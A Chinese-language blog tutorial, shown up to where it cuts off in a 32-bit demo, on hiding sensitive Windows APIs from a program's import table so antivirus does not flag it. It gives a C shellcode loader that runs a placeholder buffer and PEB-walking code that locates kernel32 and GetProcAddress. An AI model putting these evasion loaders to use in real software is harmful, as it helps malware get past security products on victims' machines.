<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-免杀/隐藏导入表" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.570Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="隐藏导入表"><a href="#隐藏导入表" class="headerlink" title="隐藏导入表"></a>隐藏导入表</h1><p>通过pe文件，我们可以看见IAT导入表，在这个表中，记录了PE文件的使用以及相关的dll模块</p>
<p>我这里在vs2022中用dumpin &#x2F;imports 命令举例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpbin /imports .\NormalInjection.exe</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240924124247030.png" alt="image-20240924124247030"></p>
<p>这里我们可以看见，很多api，其中，<strong>VirtualAlloc，CreateThread</strong>等api会被重点盯防</p>
<p>那么，怎么在导入表中隐藏这些api呢</p>
<p>  首先我们使用的方法可以是，不直接调用这些函数，转而从kernel32里面直接找到这些函数的真实加载地址来做到不出现敏感api</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">UCHAR buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LPVOID</span><span class="params">(WINAPI* pVirtualAlloc)</span><span class="params">(LPVOID, DWORD, DWORD, DWORD)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES,</span></span><br><span class="line"><span class="params">SIZE_T,LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE,DWORD)</span>;</span><br><span class="line">DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line">HMODULE hKernal32 = LoadLibrary(<span class="string">L&quot;Kernel32.dll&quot;</span>);<span class="comment">//载入kernel32</span></span><br><span class="line">pVirtualAlloc VirtualAlloc =</span><br><span class="line">(pVirtualAlloc)GetProcAddress(hKernal32,<span class="string">&quot;VirtualAlloc&quot;</span>);<span class="comment">//找到VirtualAlloc的地址</span></span><br><span class="line">pVirtualProtect VirtualProtect =</span><br><span class="line">(pVirtualProtect)GetProcAddress(hKernal32,<span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">pCreateThread CreateThread =</span><br><span class="line">(pCreateThread)GetProcAddress(hKernal32,<span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">pWaitForSingleObject WaitForSingleObject =</span><br><span class="line">(pWaitForSingleObject)GetProcAddress(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line">VirtualProtect(&amp;buf, <span class="keyword">sizeof</span> buf, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)</span><br><span class="line">(CHAR*)buf, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我就不放截图演示导入表了，但是同时我们会获得一个疑问</p>
<p>那如果杀软连<strong>Loadlibary 和 GetProcAddress</strong>都查，那么怎么办呢</p>
<h2 id="TEB，PEB结构"><a href="#TEB，PEB结构" class="headerlink" title="TEB，PEB结构"></a>TEB，PEB结构</h2><p><strong>TEB</strong>（Thread Environment Block）和 <strong>PEB</strong>（Process Environment Block）是 Windows 操作系统中用于管理线程和进程的关键数据结构。它们在系统内部用于存储与进程和线程相关的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在64位系统下</span><br><span class="line"></span><br><span class="line">     gs:[0x30] 指向TEB</span><br><span class="line"></span><br><span class="line">     gs:[0x60] 指向PEB</span><br><span class="line">     </span><br><span class="line">在32位系统下</span><br><span class="line">	mov eax, fs:[0x30]  ; EAX = PEB 地址</span><br><span class="line">	mov eax, fs:[0x18]  ; EAX = TEB 地址</span><br></pre></td></tr></table></figure>

<p>为了逻辑完整，我们从头开始讲</p>
<p>这里我们以64位环境为例，用windbg来查看teb的结构</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>: kd&gt; dt _TEB</span><br><span class="line">nt!_TEB</span><br><span class="line">   <span class="number">+0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   <span class="number">+0x038</span> EnvironmentPointer : Ptr64 Void</span><br><span class="line">   <span class="number">+0x040</span> ClientId         : _CLIENT_ID</span><br><span class="line">   <span class="number">+0x050</span> ActiveRpcHandle  : Ptr64 Void</span><br><span class="line">   <span class="number">+0x058</span> ThreadLocalStoragePointer : Ptr64 Void</span><br><span class="line">   <span class="number">+0x060</span> ProcessEnvironmentBlock : Ptr64 _PEB</span><br><span class="line">   <span class="number">+0x068</span> LastErrorValue   : Uint4B</span><br><span class="line">   <span class="number">+0x06c</span> CountOfOwnedCriticalSections : Uint4B</span><br><span class="line">   <span class="number">+0x070</span> CsrClientThread  : Ptr64 Void</span><br><span class="line">  .........................................以下省略</span><br></pre></td></tr></table></figure>

<p>可以看见，这个0x60处有一个指针指向PEB</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>: kd&gt; dt _PEB</span><br><span class="line">nt!_PEB</span><br><span class="line">   +<span class="number">0x000</span> InheritedAddressSpace : UChar</span><br><span class="line">   +<span class="number">0x001</span> ReadImageFileExecOptions : UChar</span><br><span class="line">   +<span class="number">0x002</span> BeingDebugged    : UChar</span><br><span class="line">   +<span class="number">0x003</span> BitField         : UChar</span><br><span class="line">   +<span class="number">0x003</span> ImageUsesLargePages : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsProtectedProcess : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsImageDynamicallyRelocated : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> SkipPatchingUser32Forwarders : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsPackagedProcess : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsAppContainer   : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsProtectedProcessLight : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsLongPathAwareProcess : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> Padding0         : [<span class="number">4</span>] UChar</span><br><span class="line">   +<span class="number">0x008</span> Mutant           : Ptr64 Void</span><br><span class="line">   +<span class="number">0x010</span> ImageBaseAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x018</span> Ldr              : Ptr64 _PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x020</span> ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +<span class="number">0x028</span> SubSystemData    : Ptr64 Void</span><br><span class="line"> .......以下省略</span><br></pre></td></tr></table></figure>

<p>在0x18偏移处有一个_PEB_LDR_DATA结构，跟进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>: kd&gt; dt _PEB_LDR_DATA</span><br><span class="line">nt!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Initialized      : UChar</span><br><span class="line">   +<span class="number">0x008</span> SsHandle         : Ptr64 Void</span><br><span class="line">   +<span class="number">0x010</span> InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x020</span> InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x030</span> InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x040</span> EntryInProgress  : Ptr64 Void</span><br><span class="line">   +<span class="number">0x048</span> ShutdownInProgress : UChar</span><br><span class="line">   +<span class="number">0x050</span> ShutdownThreadId : Ptr64 Void</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个结构里面，有三个链表头，他们都是描述同一批模块，但是链表内模块顺序不同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InLoadOrderModuleList ：模块加载的顺序</span><br><span class="line">InMemoryOrderModuleList ：模块在内存的顺序</span><br><span class="line">InInitializationOrderModuleList ：模块初始化的顺序</span><br></pre></td></tr></table></figure>

<p>每个链表头都有两个结构体成员，Flink和Blink分别指向下一个块和上一个块</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925090246577.png" alt="image-20240925090246577"></p>
<p>而<strong>我们winapi一般都可以从kernel32里面调用</strong></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 先找到PEB模块基址</span><br><span class="line">2. 再从PEB中找到 PEB_LDR_DATA 结构</span><br><span class="line">3. 定位双向链 InInitializationOrderModuleList</span><br><span class="line">4. 获得DLL的基地址</span><br></pre></td></tr></table></figure>

<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>我们可以首先用汇编拿到PEB的地址</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">	GetPeb PROC</span><br><span class="line">	mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">	ret</span><br><span class="line">	GetPeb ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>在64位中已经不支持内联汇编，需要额外的去写一个asm文件</p>
<p>在vs2022创建的项目中 添加一个新建项，改为asm文件</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925091158089.png" alt="image-20240925091158089"></p>
<p>添加完文件之后，右键项目打开生成自定义界面，添加一个masm</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925091309114.png" alt="image-20240925091309114"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925091348716.png" alt="image-20240925091348716"></p>
<p>修改asm文件的属性，使用自定义生成工具</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925091454814.png" alt="image-20240925091454814"></p>
<p>在属性的常规中的两行里面填入下面内容</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令行：ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).<span class="keyword">asm</span></span><br><span class="line">输出：$(IntDir)%(fileName).obj</span><br></pre></td></tr></table></figure>

<p>在我们的主函数里面声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern &quot;C&quot; PVOID64 __stdcall GetPEB();//函数名以实际asm文件中定义的函数名为准</span><br></pre></td></tr></table></figure>



<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>这个我没有试过，但是我还是贴了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shellcode.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">USHORT Length;</span><br><span class="line">USHORT MaximumLength;</span><br><span class="line">PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD Length;</span><br><span class="line"><span class="type">bool</span> Initialized;</span><br><span class="line">PVOID SsHandle;</span><br><span class="line">LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">PVOID DllBase;</span><br><span class="line">PVOID EntryPoint;</span><br><span class="line">UINT32 SizeOfImage;</span><br><span class="line">UNICODE_STRING FullDllName;</span><br><span class="line">UNICODE_STRING BaseDllName;</span><br><span class="line">UINT32 Flags;</span><br><span class="line">USHORT LoadCount;</span><br><span class="line">USHORT TlsIndex;</span><br><span class="line">LIST_ENTRY HashLinks;</span><br><span class="line">PVOID SectionPointer;</span><br><span class="line">UINT32 CheckSum;</span><br><span class="line">UINT32 TimeDateStamp;</span><br><span class="line">PVOID LoadedImports;</span><br><span class="line">PVOID EntryPointActivationContext;</span><br><span class="line">PVOID PatchInformation;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span> <span class="params">(WINAPI * PLOADLIBRARY)</span><span class="params">(LPCSTR)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span> <span class="params">(WINAPI * PGETPROCADDRESS)</span><span class="params">(HMODULE, LPCSTR)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span> <span class="params">(WINAPI * PMESSAGEBOX)</span><span class="params">(HWND, LPCSTR,LPCSTR,UINT)</span>;</span><br><span class="line">DWORD WINAPI <span class="title function_">ShellCode</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">ShellCode();</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD WINAPI <span class="title function_">ShellCode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">PGETPROCADDRESS pGetProcAddress = <span class="literal">NULL</span>;</span><br><span class="line">PLOADLIBRARY pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line">PMESSAGEBOX pMessageBox = <span class="literal">NULL</span>;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY pPLD;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY pBeg;</span><br><span class="line">WORD *pFirst = <span class="literal">NULL</span>;</span><br><span class="line">WORD *pLast = <span class="literal">NULL</span>;</span><br><span class="line">DWORD ret = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">DWORD dwKernelBase = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> szKernel32[] =</span><br><span class="line">&#123;<span class="string">&#x27;k&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;r&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;3&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;.&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// Unicode</span></span><br><span class="line"><span class="type">char</span> szUser32[] = &#123;<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> szGetProcAddress[] =</span><br><span class="line">&#123;<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> szLoadLibrary[] = &#123;<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> szMessageBox[] = &#123;<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> szHelloShellCode[] =</span><br><span class="line">&#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax,fs:[<span class="number">0x30</span>] <span class="comment">// PEB</span></span><br><span class="line">mov eax,[eax+<span class="number">0x0C</span>] <span class="comment">// PEB-&gt;LDR</span></span><br><span class="line">add eax,<span class="number">0x0C</span> <span class="comment">// LDR-&gt;InLoadOrderModuleList</span></span><br><span class="line">mov pBeg,eax</span><br><span class="line">mov eax,[eax]</span><br><span class="line">mov pPLD,eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Find Kerner32.dll</span></span><br><span class="line"><span class="keyword">while</span> (pPLD != pBeg)</span><br><span class="line">&#123;</span><br><span class="line">pLast = (WORD*)pPLD-&gt;BaseDllName.Buffer;</span><br><span class="line">pFirst = (WORD*)szKernel32;</span><br><span class="line"><span class="keyword">while</span> (*pFirst &amp;&amp; *pLast == *pFirst)</span><br><span class="line">pFirst++,pLast++;</span><br><span class="line"><span class="keyword">if</span> (*pFirst == *pLast)</span><br><span class="line">&#123;</span><br><span class="line">dwKernelBase = (DWORD)pPLD-&gt;DllBase;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pPLD = (LDR_DATA_TABLE_ENTRY*)pPLD-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Kernel32.dll -&gt; GetProcAddress</span></span><br><span class="line"><span class="keyword">if</span> (dwKernelBase != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 通过指针定位到导出表</span></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwKernelBase;</span><br><span class="line">PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader +</span><br><span 